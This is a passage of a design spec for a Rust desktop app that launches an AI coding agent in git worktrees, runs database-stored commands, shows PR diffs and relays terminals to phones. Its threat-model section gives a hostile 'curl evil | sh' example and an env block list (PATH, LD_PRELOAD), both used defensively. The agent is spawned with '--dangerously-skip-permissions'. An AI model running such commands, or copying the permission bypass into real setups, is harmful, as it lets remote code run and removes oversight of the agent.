A load-bearing invariant threaded through the whole section: **the local launch sequence for the human pressing "Start coding" and the sequence triggered by a relay `start_session` frame are the SAME code path.** The `coding` crate exposes exactly one entry point, and §08's control channel calls it. There is no second, divergent "remote start" implementation.

---

### 7.1 DC-1 — The Start-coding launcher (`coding` crate)

The `coding` crate is a small, gpui-free-at-its-core state machine plus a thin gpui-facing driver. Its public entry point:

```rust
// crates/coding/src/lib.rs
pub struct LaunchRequest {
    pub issue_id: Uuid,
    pub issue_identifier: String, // e.g. "EXP-42" — used for the branch name
    pub device_label: String,     // hostname; also the coding_sessions.device_label
    pub origin: LaunchOrigin,     // Local | Relay { device_id, claimant }
}

pub enum LaunchOutcome {
    Spawned { session_id: Uuid, terminal_tab: TabId, worktree: PathBuf, branch: String },
    Disabled { reason: DisabledReason }, // no repo linked, doctor failed, token denied
}

pub async fn launch(req: LaunchRequest, deps: &CodingDeps) -> Result<LaunchOutcome, CodingError>;
```

`CodingDeps` bundles the injected collaborators so the crate stays testable: the `api::TrpcClient` (mutation client + session), the resolved `Settings` (claude path, repos root, branch prefix — §7.7), the `terminal::TerminalManager` handle (§06), the `api::key::PersonalKey` provider (§7.2), and the `steer::Publisher` factory (§08). The sequence below runs **identically** for `LaunchOrigin::Local` and `LaunchOrigin::Relay`.

#### The eight-step sequence

**Step 1 — Resolve the repository (the coding-first gate; EXP-4).**
Call `repositories.forIssue({ issueId })`. It returns `{ repositoryId, fullName, defaultBranch } | null`. If `null`, the launcher **does not proceed and never spawns anything**. The **"Start coding" button lives on the issue-detail header** (§4.2 — it replaces web's "Start on my desktop" remote-start button, but launches locally; the run bar is §7.5). When repo is null the UI reflects this as a *disabled* button with the tooltip / helper text **"Link a repository to this project in workspace settings."** This is the EXP-4 rule made structural: the desktop must never falsely block coding *and* must never launch into a repo-less void. Because repo state comes from the server (the workspace `repositories` registry), a stale "GitHub not connected" is impossible — the button is driven by live tRPC state, not a cached local flag. The button's *enabled* state is computed from `repositories.forIssue` being non-null **AND both** `doctor.claude.ok` **&&** `doctor.git.ok` (§7.7 — "the doctor's last result being green" means *both* tools resolved). ANDing in **git** as well as claude prevents the "falsely proceed then crash at step 3 (git clone/worktree)" pattern EXP-4 warns against; the `DisabledReason` distinguishes which tool failed (`DoctorFailed(ToolCheck)`).

**Step 2 — Mint the JIT installation token.**
Call `repositories.installationToken({ repositoryId })` → `{ token, fullName, defaultBranch, expiresAt }`. The token is a GitHub-App installation token, TTL ~55 min (`INSTALLATION_TOKEN_TTL_MS` server-side), **session-gated and NEVER persisted, never logged, never written to any file other than the transient git remote URL**. Redact it from every tracing span (`#[instrument(skip(token))]`) and from any error `Display`. If this call throws `PRECONDITION_FAILED` ("the Exponential GitHub App is not installed on …"), surface it as `Disabled { reason: GithubAppMissing { full_name } }` with a link out to workspace settings on web — the desktop never carries the App-install flow (§7.8).

**Step 3 — Git via `argv`, never `gh`.**
The only local binaries the launcher shells out to are `git` and `claude`. `gh` is never used. All git steps go through `std::process::Command` (or the crate's thin `git.rs` wrapper) with explicit argv — no shell string interpolation of the token.

- `ensure_clone(repos_root, full_name, token_url)` — if `<repos_root>/<owner>/<name>` is not a git repo, `git clone <token_url> <clonePath>`; otherwise no-op (reuse).
- `create_worktree(clone_path, branch, base_ref)` where `branch = "<prefix><IDENTIFIER>"` (default prefix `exp/`, so `exp/EXP-42`) and `base_ref = "origin/<defaultBranch>"`. **Reuse** an existing worktree/branch if present (idempotent relaunch of the same issue attaches to the existing checkout rather than erroring). One issue = one PR = one `exp/<IDENTIFIER>` branch, matching the server's one-issue-one-branch model.
- `set_token_remote(worktree, https://x-access-token:<token>@github.com/<fullName>.git)` — **re-set on EVERY launch.** The worktree outlives the ~55-min token; the previous embedded token is dead on relaunch, so `git remote set-url origin …` runs every time before any push can happen. Never log this URL.

Worktree layout on disk:

```
<repos_root>/<owner>/<name>                          # the clone (default branch checkout)
<repos_root>/<owner>/<name>.worktrees/<branch>       # one worktree per branch; '/' in branch → '-'
```

So `exp/EXP-42` on `acme/web` lives at `~/Exponential/repos/acme/web.worktrees/exp-EXP-42`. The branch-name → path sanitization replaces `/` with `-` in the directory segment only; the actual git branch stays `exp/EXP-42`.

**Step 4 — Write `.mcp.json` into the worktree.**
```json
{
  "mcpServers": {
    "exponential": {
      "type": "http",
      "url": "<baseUrl>/api/mcp",
      "headers": { "Authorization": "Bearer <expu_ personal key>" }
    }
  }
}
```
`<baseUrl>` is the signed-in server origin (`BETTER_AUTH_URL` equivalent from the api session). The `expu_` key is the hidden auto-minted personal key from §7.2 — this file is the ONLY place the raw key lands on disk in a coding session, and the worktree lives under the user's repos root (their own machine). This authenticates the spawned `claude` process as the real signed-in user against `/api/mcp`, exposing the `exponential_*` MCP tools (see step 5).

**Step 5 — Write `PROMPT.md` into the worktree.**
Plan-first seed prompt. Concretely (templated with the issue title/identifier/description fetched from the sync store):
> You are working on **{IDENTIFIER}: {title}** in this repository. Read the issue context below. **First, propose a concise plan and WAIT for explicit go-ahead before writing code.** Once approved, implement the change, then commit and push your branch and open a pull request by calling the `exponential_pr_open` MCP tool. You may set the issue status with `exponential_issues_update_status` (`in_progress` when you start, `done` when the PR is open). Do not use `gh`.

The named MCP tools are real and verified: `exponential_pr_open` (server opens + links the PR through the GitHub App) and `exponential_issues_update_status`. The desktop never opens the PR itself — Claude does, via MCP, exactly as the web/native launcher contract already prescribes.

**Step 6 — `codingSessions.start({ issueId, deviceLabel })` BEFORE spawn.**
This must complete (or be bounded — see §7.2 on not blocking the critical path) before the child process spawns, because the returned `coding_sessions.id` is the key for the terminal tab (§06) and the steer session room (§08). The server enforces the plan's concurrent-session capacity here (`assertWithinCodingSessionLimit`, throws `PRECONDITION_FAILED` with an upgrade nudge on cloud; unlimited self-hosted) — surface that as `Disabled { reason: SessionLimit }` with the upgrade copy. The row is the 14th Electric shape and powers the cross-client "coding now" badge; the desktop does not fabricate the badge locally, it reads its own synced row back.

**Step 7 — Spawn `claude`.**
Ask the `TerminalManager` (§06) to open a **Claude tab keyed by `coding_sessions.id`**, with:
- program = the resolved Claude CLI path (default `claude`, §7.7),
- args = `["--model", <claude model setting, §7.7 — default "opus">, "--dangerously-skip-permissions"]` — the model is ALWAYS passed explicitly so the user's CLI default (which may be a scarcer model like Fable) is never silently consumed by coding sessions or E2E tests (locked 2026-07-03),
- `cwd` = the worktree path,
- and an initial written line seeding the session: **"Read PROMPT.md in this directory, then follow it."**

The tab is a normal PTY-backed terminal tab (§06 owns the PTY master and the read-loop tee that simultaneously feeds the emulator and the steer publisher). The launcher hands the `session_id` to both the terminal tab and, if steering is enabled, the `steer::Publisher` so the same PTY is tee'd to phones (§08).

**Step 8 — On child exit: `codingSessions.end({ id })` (idempotent) + tear down the publisher.**
The terminal's `child.wait()` thread (§06) signals exit back onto the foreground executor; the launcher calls `codingSessions.end` (the server makes ending an already-ended session a no-op, so a relay-side kill that already ended it is safe) and tells `steer::Publisher` to close the session room (§08). The terminal tab itself stays open showing the final scrollback + exit-code strip (§7.5) — exiting the coding process does not nuke the user's ability to read what happened.

#### Failure surfaces (all non-fatal, all surfaced in the run bar / issue detail)
`DisabledReason` variants: `NoRepositoryLinked`, `GithubAppMissing`, `DoctorFailed(ToolCheck)`, `SessionLimit`, `TokenDenied`. None of them panic; each renders as a small inline error with a remediation link. This is the concrete EXP-4 "never falsely block, always explain" contract.

---

### 7.2 DC-2 — The hidden, auto-minted personal key (EXP-2a)

**There is never a manual API-key text field in the desktop UI.** EXP-2a is explicit: the personal key for local coding is hidden and auto-generated. The `api` crate owns this.

Server procedures (already exist, verified in `apps/web/src/lib/trpc/users.ts`):
- `users.mintPersonalApiKey({ name? })` → `{ key, id, name, start, prefix, createdAt }` — `key` is the RAW `expu_…` credential, returned **exactly once** (only a hash is stored).
- `users.listPersonalApiKeys()` → `{ keys: [{ id, name, start, prefix, createdAt, lastRequest }] }`.
- `users.revokePersonalApiKey({ id })` → `{ ok: true }` (deletes the row).

Desktop behavior:

**Auto-mint on first coding session.** The first time the launcher needs the key (step 4 of §7.1) and the token store has none, the `api` crate calls `mintPersonalApiKey({ name: "Device: <hostname>" })`, stashes the raw key in the file-based token store (§7.2 storage), and returns it. Subsequent sessions read it from the store. The user never sees, types, or pastes a key.

**Settings shows a STATUS row, not a value.** The settings pane (§7.7) renders exactly:
> **Personal API key** — active · `<start>`… — *authenticates the coding agent as you*   [ Regenerate ]

`<start>` is the non-secret key prefix from `listPersonalApiKeys`. **Regenerate is the ONLY control** and it is *mint-new-then-revoke-old*: mint a fresh key (`name: "Device: <hostname>"`), write it to the token store, then revoke the previous row by id. Order matters — never revoke before the new key is safely stored, or a crash mid-operation leaves the device with no working key. There is no "reveal", no "copy", no manual entry — the raw value only ever flows token-store → `.mcp.json`.

**Storage: the file-based token store** (`0600` file / `0700` dir under the app data dir, perms set *before* the write). **Locked 2026-07-03: never the OS keyring** — no Keychain prompts, works on the exact fresh-Ubuntu boxes EXP-5 flags with no Secret Service. The token-store abstraction (`api/src/token_store.rs`) is shared with the Better Auth session token store; the personal key is a second named entry (`{data_dir}/accounts/{id}/personal-key`, alongside `token`). See §03 for the crate wiring and §09 note that iOS uses its own Keychain access-group store (unrelated).

**Never block the launcher critical path.** Key work must not stall Start-coding perceptibly:
- Bound the mint/read await to ~2s so a slow network mint never stalls the launcher; local file reads never block.
- Run the steer config prefetch (`steer.config`, §08) **concurrently** with the git prep of §7.1 step 3 using a `join`, so the two independent I/O chains overlap. The key read and git clone/worktree also overlap where possible; only step 4 (`.mcp.json`) actually needs the key, so the mint can race the clone.

---

### 7.3 DC-4 — Run configs in the database (EXP-2d) — the ONE new schema addition

Run configs are the JetBrains-style launch commands. EXP-2d is explicit: they are **NOT stored in the repo** (no `.exp/` files, no committed YAML) — they live in the **database**, per project, and are "essentially a terminal command to launch in the terminal." This is the *only* schema change in the whole v3 plan.

#### 7.3.1 Schema (`packages/db-schema/src/schema.ts`)

The table already exists verbatim on `archive/native-desktop-wave1-2`; **lift it as a fresh server addition** and run `bun run migrate:generate && bun run migrate`. It is **server-only — NOT an Electric shape** (proxy count stays 14). Definition (verified against the archive):

```ts
export const runConfigs = pgTable(
  `run_configs`,
  {
    id: uuidPk(),
    projectId: uuid(`project_id`).notNull()
      .references(() => projects.id, { onDelete: `cascade` }),
    // Denormalized on insert by the tRPC layer — NO trigger (server-only table).
    workspaceId: uuid(`workspace_id`).notNull()
      .references(() => workspaces.id, { onDelete: `cascade` }),
    name: varchar({ length: 255 }).notNull(),
    // Program + args, spawned as-is (no shell). ≥1 element.
    argv: jsonb().$type<string[]>().notNull(),
    // Relative to repo root; null = repo root. Reject absolute paths and `..`.
    cwd: text(),
    // Extra env. PATH/LD_PRELOAD/DYLD_* stripped server-side.
    env: jsonb().$type<Record<string, string>>().notNull().default(sql`'{}'::jsonb`),
    sortOrder: doublePrecision(`sort_order`).notNull().default(0),
    ...timestamps,
  },
  (table) => [
    unique().on(table.projectId, table.name),
    index(`idx_run_configs_workspace`).on(table.workspaceId),
  ]
)
```

Also lift `selectRunConfigSchema` (with the `argv: z.array(z.string())` / `env: z.record(...)` refinements). No custom trigger is added — `workspaceId` is denormalized in the router on insert (the `populate_*` triggers are for *synced* child tables so Electric shape filters stay workspace-scoped; `run_configs` is never synced, so no trigger).

#### 7.3.2 Router (`apps/web/src/lib/trpc/run-configs.ts`, mount in `api/trpc/$.ts` as `runConfigs`)

Lift verbatim from the archive branch (the file exists there). Shape:
- `list({ projectId })` — **member-read** (`assertWorkspaceMember`), ordered by `sortOrder`, then `name`.
- `create({ projectId, name, argv, cwd?, env? })` — **owner-only** (`assertWorkspaceOwner`). Denormalize `workspaceId` from the project. Validate via the pure core (below): `argv.length ≥ 1`, name/arg/cwd/env length caps, `runConfigCwdError(cwd)` must be null, `env` passed through `sanitizeRunConfigEnv`. `unique(projectId, name)` collisions → `CONFLICT`.
- `update({ id, name?, argv?, cwd?, env?, sortOrder? })` — **owner-only**. `sortOrder` is how reorder is done (drag in the editor → `update.sortOrder`).
- `delete({ id })` — **owner-only**.

#### 7.3.3 Pure core (`apps/web/src/lib/run-configs.ts`) — lift verbatim, shared by server + web editor

Contains (verified): `MAX_RUN_CONFIG_NAME=255`, `MAX_ARGV_ITEMS=64`, `MAX_ARG_LENGTH=1024`, `MAX_CWD_LENGTH=512`, `MAX_ENV_*` caps; `runConfigCwdError(cwd)` (rejects absolute paths `/`, `\`, `C:\`, and any `..` segment); `isBlockedEnvKey` / `sanitizeRunConfigEnv` (strips `PATH`, `LD_PRELOAD`, `DYLD_*` case-insensitively); and the `parseArgvLine` / `formatArgvLine` shell-*like* tokenizer (whitespace-split; `'…'` literal; `"…"` with `\"`/`\\`; backslash escapes outside quotes) — **nothing is ever run through a shell; the desktop spawns argv as-is.**

#### 7.3.4 Web editor (`apps/web/src/components/.../project-run-configs-dialog.tsx`) — lift verbatim (owner-only)

The web app keeps an owner-only run-configs editor (a project setting): name + a single monospace command line (backed by `parseArgvLine`/`formatArgvLine`) + optional cwd + env rows + drag-reorder. This exists on the archive branch; lift it so run configs can be authored from web too, not only desktop.

#### 7.3.5 SECURITY — this REVERSES the "never execute synced values" invariant

This is the single most dangerous thing in the desktop app and must be treated as such. Everywhere else, the clients treat server/synced data as *inert display data* and never execute it. Run configs are **DB-stored argv that the desktop spawns as local child processes.** A compromised or malicious workspace owner (or a stolen owner session) could write `argv: ["/bin/sh", "-c", "curl evil | sh"]` and have it run on every member's machine.

The server's `cwd`/`env` sanitization (reject `..`/absolute cwd, strip `PATH`/`LD_PRELOAD`/`DYLD_*`) is **defense-in-depth ONLY — it is NOT sufficient** (it does nothing about the `argv[0]` binary itself). The real compensating control is **client-side and mandatory**:

> **Per-device "Trust & Run" prompt.** The desktop computes a `commandSetHash` over the *full fetched set* of run configs for a project (stable-serialize each `{name, argv, cwd, env}`, sort by id, hash — `blake3` or `sha256`). It persists, per device + per project, the last-trusted hash. **Whenever the fetched set changes (hash mismatch), the next launch is blocked behind a Trust & Run dialog** that shows the exact argv/cwd/env about to run and requires explicit confirmation. Trusting stores the new hash. This re-fires on *any* change — add, edit, reorder that alters content, or a config appearing from another author. A never-before-seen device starts untrusted.

Concretely in `coding`/`ui`: `run_configs::TrustStore` (a small `rusqlite` table in the per-account store, `(device_id, project_id) → trusted_hash`), checked in the run-bar play handler (§7.5) before ever calling `TerminalManager::spawn`. The dialog is a gpui-component `Modal`/`Dialog` (via `Root`'s overlay host) listing the commands. **Fable: do not skip this. The Trust prompt is the security boundary, not a nicety.**

---

### 7.4 Interaction between run configs and the terminal (interface to §06)

The `coding`/`ui` layer never touches PTYs directly. To launch a run config it calls the §06 `TerminalManager`:

```rust
// owned by §06; called from the run bar
manager.spawn(SpawnSpec {
    kind: TabKind::Run { run_config_id },
    program: argv[0].clone(),
    args: argv[1..].to_vec(),
    cwd: resolve_cwd(worktree_root, cfg.cwd), // repo root when null; §7.3 validated
    env: cfg.env.clone(),                     // already server-sanitized
    title: cfg.name.clone(),
});
```

`resolve_cwd` joins the (already-validated, relative) `cwd` onto the active worktree/clone root; a run config without an active coding worktree resolves against the project's clone root (`<repos_root>/<owner>/<name>`). §06 owns tab identity, the PTY read-loop tee, exit signaling, and the grid element; §07 owns *which* command goes into a tab and the play/stop UX around it.

---

### 7.5 DC-5 — Play/stop + tabs (EXP-2e)

The UI mirrors JetBrains and is deliberately **compact** (EXP-2f — the whole desktop UI is smaller/denser than web; see §04 for density tokens).

**Top-right run bar** (`ui/src/run_bar.rs`), rendered in the title bar / top strip of the center panel:
- A compact gpui-component **`Select`/`Dropdown`** listing the project's run configs (from `runConfigs.list`) plus a trailing "Edit configurations…" item opening the editor dialog (§7.3.4 parity).
- A **play `Button`** (`variant = ghost`, icon-only, `h-5 w-5`-equivalent at desktop density) to the right of the dropdown.

**Play semantics:** clicking play (a) runs the Trust gate (§7.3.5), (b) reveals/focuses the **bottom terminal dock** (§06 `DockArea` bottom), (c) opens a new terminal **tab for that run config** (or re-uses/re-runs its existing tab), and (d) the play button **becomes a stop button** while the child is alive. Stop sends SIGTERM (then SIGKILL after a grace period) to that tab's child via §06.

**Exit-code strip:** when the child exits, the tab header shows a small colored strip / badge with the exit code (green `0`, red non-zero) — this is the gate-visible "shows an exit code" requirement. The tab stays open with final scrollback.

**Tabs = one Claude + one per run + user plain shells.** The bottom dock is a multi-tab terminal (§06 `TerminalManager` + gpui-component `Tab`/`TabBar`):
- the **Claude tab** (keyed by `coding_sessions.id`, opened by the launcher §7.1 step 7),
- **one tab per launched run config**,
- **user-created plain shell tabs** — a `+` in the tab bar opens a login shell in the active worktree/clone (like any IDE terminal). EXP-2e literally asks for "create plain terminal sessions like any IDE."

Add / close / switch / reorder tabs are §06 concerns; the run bar just requests spawns and reflects alive/dead state.

---

### 7.6 DC-6 — Multi-window session isolation

Multi-window is first-class (see §03 shell): `cx.open_window` is called N times; the global `Store` (sync collections) and `Theme` are gpui globals shared across all windows, so every window sees the same live data. IDE state is **per window**: each window has its own `DockArea`/`DockAreaState`, its own center `TabPanel`s, and its own bottom terminal dock.

**N issues = N worktrees = N terminal tabs = N PTYs = N children, with NO concurrency gate on the desktop side.** Two issues coding simultaneously in two windows each get their own `exp/<ID>` worktree (different branches → different `.worktrees/` dirs, no collision), their own Claude tab keyed by their own `coding_sessions.id`, their own PTY + child, and their own steer publisher room. The only capacity limit is the *server's* plan check in `codingSessions.start` (§7.1 step 6) — the client never self-throttles.

**Pop-out = "reparent, never recreate."** Dragging a center tab (an issue detail, a diff, or a terminal tab) out into a new window must **move the existing `Entity<T>` model** to the new window and **re-attach a fresh view** — it must **never drop and rebuild the PTY / child / publisher.** Recreating would kill the running `claude`. Concretely:
1. `cx.open_window(...)` and **present the new window first** (so its surface realizes at nonzero size — a zero-size surface panics the grid element on first layout, a hard-won gotcha),
2. then move the model handle into the new window's `DockArea` and build the view there,
3. drop the old view (not the model).

The PTY master, the read-loop thread, the child handle, and the steer publisher all hang off the moved model and survive the reparent untouched. This mirrors Zed's "move the entity, re-render the view" pattern (studied from `crates/workspace`, reimplemented — no GPL code copied).

---

### 7.7 DC-3 — Settings + tooling doctor + onboarding (EXP-2b)

A JetBrains-SDK-settings-style pane, built from gpui-component `form` / `input` / `switch` / `separator` / `description_list` inside a `sidebar`-navigated settings surface (§04). Fields:

| Setting | Default | Notes |
|---|---|---|
| **Claude CLI path** | `claude` | Editable; accepts an absolute path. Used verbatim as the launcher's program (§7.1 step 7) and the doctor's target. |
| **Claude model** | `opus` | Passed as `--model <value>` on every coding-session spawn (§7.1 step 7). Explicit-always so the user's `claude` CLI default is never silently used (it may be a scarcer model, e.g. Fable — locked 2026-07-03). Free-text with the common values offered (opus, sonnet, haiku, fable). |
| **Repos & worktrees root** | `~/Exponential/repos` | Tilde-expanded. The `<repos_root>` of §7.1's layout. |
| **Branch prefix** | `exp/` | Prepended to `<IDENTIFIER>` for the coding branch. |
| **Personal API key** | *(auto)* | STATUS row only (§7.2): "active · `<start>`…" + **Regenerate**. Never a value field. |
| **Tooling doctor** | — | A **"Check tools"** button running the doctor (below). |

Settings persist to the per-account local config (the `rusqlite` store or a small `settings.json` in the config dir); they are **local, per-install**, never synced.

**Tooling doctor (`coding/src/doctor.rs`).** Runs `claude --version` and `git --version` (using the configured Claude path), capturing success + version string or the spawn error:

```rust
pub struct ToolCheck { pub tool: Tool, pub ok: bool, pub version: Option<String>, pub error: Option<String> }
pub async fn run_doctor(settings: &Settings) -> DoctorReport; // { claude: ToolCheck, git: ToolCheck }
```

- **"Check tools"** in settings renders each result as a `description_list` row with a green check + version or a red error.
- **Onboarding runs the doctor automatically with clear errors BEFORE Start coding is usable.** If `claude` is not found, the onboarding step shows a red, actionable message: **"claude not found on PATH — set an absolute path"** with an inline field jumping to the Claude-CLI-path setting; a missing `git` shows the analogous **"git not found on PATH"** error. This is the concrete EXP-2b gate: **the doctor blocks Start coding when EITHER tool is missing** — the launcher's enabled-state in §7.1 step 1 ANDs in **both** `doctor.claude.ok` **&&** `doctor.git.ok` (EXP-2b requires verifying *both* claude and git; a machine with git missing must be blocked at the button, not allowed to proceed and crash at §7.1 step 3's git clone). The `DoctorFailed(ToolCheck)` reason names which tool failed.
- Onboarding also **generates and persists a stable per-install `deviceId`** (a UUID in the local config), used for steer presence (§08) and the run-config Trust store (§7.3.5). Generate once, never regenerate.

Onboarding order for a fresh desktop install: sign in (§ api/login, robust browser-open per EXP-5) → run doctor (claude + git) → confirm/adjust repos root + Claude path → (personal key auto-mints lazily on first coding session, nothing to do here) → land on the board.

---

### 7.8 DC-7 — Side-by-side PR diff / review (read-only v1)

When an issue has `prUrl` set, the desktop shows a **Changes** view. Data comes from `issues.prFiles({ issueId })` → `{ repo, prNumber, files: PullFile[] }`, where (verified `github-pr.ts`):

```ts
interface PullFile { filename: string; status: string; additions: number; deletions: number; patch?: string }
```

**Open question / forward-compat:** the brief's `PullFile` also names `sha` and `previousFilename`. The current server type does **not** carry them. For rename correctness and stable anchoring, extend `fetchPullFiles` to include GitHub's `sha` and `previous_filename` (both present on the GitHub "list PR files" response) and add them to `PullFile`. This is a small additive server change bundled with this feature; do it so the anchor scheme below is complete.

**Rendering (`ui/src/diff_view.rs`):**
1. Parse each file's unified `patch` into hunks (`@@ -a,b +c,d @@` headers → aligned old/new line runs). A small pure `diff/patch.rs` parser (gpui-free, unit-tested against a couple of captured real patches) yields `Hunk { old_start, new_start, rows: Vec<DiffRow> }` where `DiffRow` is `Context { old_ln, new_ln, text }`, `Removed { old_ln, text }`, or `Added { new_ln, text }`.
2. Render **two columns, old on the left / new on the right, side-by-side**, inside a gpui-component **`resizable`** split of two **`VirtualList`s** (files can be huge — virtualize both sides; keep the two lists row-aligned by emitting blank filler rows opposite adds/removes).
3. **Syntax-highlight** via gpui-component's **`highlighter`** (Tree-sitter), keyed by file extension → language, using the grammars bundled with gpui-component (it ships diff + common language grammars). Removed/added rows get the standard red/green gutter + background tint from the theme (§04 tokens); highlight spans compose over the diff tint.
4. A file list / tree on the side (gpui-component `tree` or a simple list) with per-file `+additions / −deletions` counts and `status` (added/modified/renamed/removed) badges; selecting a file scrolls the diff.

**READ-ONLY in v1**, but **anchor hunks NOW** so inline review comments can be written back later without a rewrite: every rendered diff line carries `Anchor { filename: String, side: Side /* Old | New */, line: u32 }`. Persisting anchors from day one means the future "comment on this line → GitHub review comment" path is a pure addition, not a re-architecture. Do not build the write path in v1; just carry the anchor on each row.

The web `DiffView` component is a **data-shape reference only** (it is currently unwired on web) — read it to match field names, do not assume it defines runtime behavior.

---

### 7.9 Integrations surface (EXP-1 #9 + EXP-4)

The desktop's integrations/settings area must:
- **DROP the dead Google Calendar panel** (EXP-1 #9) — the old native apps showed a stale Google Calendar integration; it does not exist in v3. No calendar UI anywhere in the desktop.
- **Show GitHub / Repositories connect state from `integrations.github.status`** (`{ configured, installed, installUrl, accounts[] }`) and the `repositories` router. Render "Connected to @acme, @you" when `installed`, or a "Not connected" state otherwise.
- **Only the GitHub-App *install* is web-only; repo connect + link ARE on desktop.** The App-**install** flow (`integrations.github.status.installUrl`) stays web-only — the desktop shows the state and a "Manage/install on the web" link that opens the browser (via the `api::opener` chain, robust per EXP-5) and **never carries the App-install flow**. But repository **management** is available on desktop and MUST be, because the per-project **primary** link is exactly what `repositories.forIssue` resolves as the Start-coding clone target (§7.1 step 1) — without it, Start coding cannot be configured from desktop, undercutting EXP-4. So the desktop Repositories pane (§4.2) can **add** a repo (`repositories.add` via `GithubRepoPicker`), **link/unlink** it to projects (`repositories.linkProject`/`unlinkProject`), **set the per-project primary** (`repositories.setPrimary` — the Star), and **remove** it (`repositories.remove`), mirroring web's `RepoRow`. This resolves the earlier §4.2↔§7.9 contradiction: install = web-only hand-off; connect + link + primary = available on both surfaces. The desktop reads live server truth for connect state, never a local guess — closing the EXP-4 "desktop wrongly said GitHub not connected / not installed" bug structurally.
- **Feedback opens in the browser (desktop v1).** The sidebar Feedback item (EXP-1 #10, §4.8) opens the feedback project (`/feedback` → `projects/exponential`) in the system browser via the same `api::opener` chain; the embedded JS widget is a desktop non-goal for v1.

---

### 7.10 DELETE, do not port

The **preview feature is dead** (EXP-2c — "DITCH the preview feature"). Do not port `apps/linux/src/ui/preview/**` or the macOS `MacPreview*` views into the desktop. There is no preview pane, no preview action, no preview run-config kind. (Its deletion is part of the Phase-0 repo cut, §02; noted here so Fable doesn't reintroduce it while building the IDE surface.)

---

### 7.11 Phase-5 gate (the acceptance bar for this section)

All must pass on a real machine before Phase 5 is done:

1. **Full Start coding on a REAL repo** (spawned with `--model opus` — E2E/agentic tests must never consume the Fable quota): press Start coding on an issue whose project has a linked repo → a worktree + `exp/<IDENTIFIER>` branch are created, `.mcp.json` + `PROMPT.md` are written, a `coding_sessions` row goes `running`, and `claude --dangerously-skip-permissions` spawns in a Claude tab and reads PROMPT.md; Claude commits, pushes, and **opens a PR via the `exponential_pr_open` MCP tool**.
2. **Hidden key:** the `expu_` key **auto-mints on the first coding session** (named `Device: <hostname>`, stored in the file-based token store), never appears as a manual field, and **Regenerate works** (mint-new-then-revoke-old, `.mcp.json` on the next launch carries the new key).
3. **Run configs:** create → list → launch a run config → a bottom terminal **tab opens, runs, and shows an exit code**; changing the config set **re-fires the Trust & Run prompt** before the next launch.
4. **Diff:** the side-by-side, syntax-highlighted, read-only diff renders from a **real PR's** `issues.prFiles`, virtualized, row-aligned, with per-line anchors present.
5. **Doctor:** with `claude` absent from PATH and no absolute override, the doctor **blocks Start coding** with the "claude not found" error; setting a valid path unblocks it.
6. **Multi-window:** **two concurrent coding sessions run in two windows**, each with its own worktree, Claude tab, PTY/child, and steer room, with no client-side concurrency gate; a pop-out reparents a live terminal without killing its child.


---

## 8. Remote steer publisher (control channel + session publisher, frozen wire protocol)

The desktop app is the **relay publisher**: the surface that tees a live `claude`
terminal out to phones and injects their keystrokes back. This section supersedes
masterplan **§3.3** (the old per-OS host — the Zig `host_pty.zig` publisher and the
Swift `PtyTail`/`script(1)` publisher) and replaces it with a single Rust
implementation in `crates/steer`. Everything else about the steer subsystem is
**frozen and inherited unchanged from masterplan §3**:

- **§3.0–3.2 wire protocol** — the frame set, the `0x01` binary output opcode, the
  close codes. Truth of record: `apps/steer-relay/src/protocol.ts`. Do **not** re-derive.
- **§3.4 claim model** — relay-memory single-steerer, first-claim-wins, release-then-claim take-over.
- **§3.5 security / kill-switch** — server-minted HS256 tickets, secret-authed admin HTTP, the Electric own-row kill.
- **§3.6 self-host degradation** — `STEER_RELAY_URL` unset ⇒ the whole subsystem is off, gracefully.

The desktop is a **ticket consumer**, never a signer. It has no `STEER_RELAY_SECRET`
and never touches `@exp/steer-ticket`'s `signSteerTicket`. It obtains server-minted
tickets over tRPC (`steer.mintTicket`) and presents them to the relay. All
authorization is decided server-side at mint time; the desktop's job is to dial,
frame, tee, and reconnect.

`crates/steer` is two modules over one WebSocket client stack:

```
crates/steer/
├── Cargo.toml          # tokio (rt-multi-thread, macros), tokio-tungstenite (rustls-tls-native-roots),
│                       #   rustls, rustls-native-certs, futures-util, bytes, serde, serde_json, thiserror, tracing
└── src/
    ├── lib.rs          # SteerConfig, ticket types (deser only), dial()/connect helpers, ws-vs-wss scheme handling
    ├── frames.rs       # ClientFrame (serialize) + ServerFrame (deserialize) mirroring protocol.ts EXACTLY; OUTPUT_OPCODE = 0x01
    ├── control_channel.rs  # per-app device-presence socket (online → start_session routing)
    └── publisher.rs        # per-session PTY tee + input inject + resize + claim/kill + ring replay + auto-reconnect
```

### 8.1 Frozen wire protocol — the Rust mirror (`frames.rs`)

`frames.rs` is a byte-for-byte mirror of `apps/steer-relay/src/protocol.ts`. It is a
plain serde module with **no gpui and no tokio dependency** so it is unit-testable
against hand-built fixtures. Fable must copy the field names and constraints
verbatim — the relay `zod`-validates every text frame and silently drops
non-conforming ones (`parseClientFrame` returns `null` ⇒ ignored), so a typo is a
silent hang, not an error.

```rust
// crates/steer/src/frames.rs
pub const OUTPUT_OPCODE: u8 = 0x01;

// ── Client → relay (TEXT frames, JSON {t, …}) ────────────────────────────────
#[derive(serde::Serialize)]
#[serde(tag = "t", rename_all = "snake_case")]
pub enum ClientFrame<'a> {
    Online   { device_id: &'a str, #[serde(skip_serializing_if = "Option::is_none")] device_label: Option<&'a str> },
    Hello    { session_id: &'a str,
               #[serde(skip_serializing_if = "Option::is_none")] issue_id: Option<&'a str>,
               #[serde(skip_serializing_if = "Option::is_none")] cols: Option<u16>,
               #[serde(skip_serializing_if = "Option::is_none")] rows: Option<u16> },
    Join,
    Resize   { cols: u16, rows: u16 },
    Input    { data: String },     // NOTE: field is `data`, utf8, ≤ 8 KiB — NOT `bytes`
    Claim,
    Release,
    Kill,
    Bye      { #[serde(skip_serializing_if = "Option::is_none")] outcome: Option<&'a str> },
}

// ── relay → client (TEXT frames) ─────────────────────────────────────────────
#[derive(serde::Deserialize)]
#[serde(tag = "t", rename_all = "snake_case")]
pub enum ServerFrame {
    Presence     { viewers: Vec<PresenceViewer>, steerer_id: Option<String> },
    Resize       { cols: u16, rows: u16 },
    StartSession { issue_id: String },
    Input        { data: String },
    Resync,
    Kill,
    Bye          { #[serde(default)] outcome: Option<String> },
    Error        { code: String, #[serde(default)] message: Option<String> },
}

#[derive(serde::Deserialize)]
pub struct PresenceViewer { pub user_id: String, pub name: String, pub perm: SteerPerm }
```

Field-name discipline that **must** be honored (each was a live native bug or a
protocol subtlety):

- **`serde(rename_all = "snake_case")`** on the tag content and **also** rename each
  field to camelCase where the JSON differs (`deviceId`, `sessionId`, `deviceLabel`,
  `issueId`, `steererId`, `userId`). The relay JSON is camelCase; Rust structs are
  snake_case. Use `#[serde(rename = "deviceId")]` per field, or a `rename_all =
